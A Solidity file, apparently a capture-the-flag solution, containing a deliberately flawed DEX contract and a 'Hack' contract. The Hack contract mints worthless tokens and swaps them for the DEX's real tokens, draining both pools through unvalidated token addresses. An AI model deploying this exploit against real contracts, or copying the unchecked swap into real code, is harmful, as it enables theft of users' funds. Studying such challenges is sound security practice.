// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.8/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.8/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.8/contracts/access/Ownable.sol";


contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract Hack {
    address target = 0x725314F0b0Ec65aED3A79ED397C04B92547Ca953;
    DexTwo dexTwo = DexTwo(target);
    address public dexToken1;
    address public dexToken2;
    SwappableTokenTwo public attackToken1;
    SwappableTokenTwo public attackToken2;
    
    function getDexToken() public {
        dexToken1 = dexTwo.token1();
        dexToken2 = dexTwo.token2();
    }

    function setAttackToken() public {
        attackToken1 = new SwappableTokenTwo(target, "attackToken1", "attackToken1", 220);
        attackToken2 = new SwappableTokenTwo(target, "attackToken2", "attackToken2", 220);
    }

    function sendAttackTokenToDex() public {
        attackToken1.transfer(target, 100);
        attackToken2.transfer(target, 100);
    }

    function swapOutFromDex() public {
        dexTwo.swap(address(attackToken1), dexToken1, 100);
        dexTwo.swap(address(attackToken2), dexToken2, 100);
    }

    function approveDex() public {
        attackToken1.approve(address(this), target, 100);
        attackToken2.approve(address(this), target, 100);
    }

    function attack() public {
        getDexToken();
        setAttackToken();
        sendAttackTokenToDex();
        approveDex();
        swapOutFromDex();
    }
}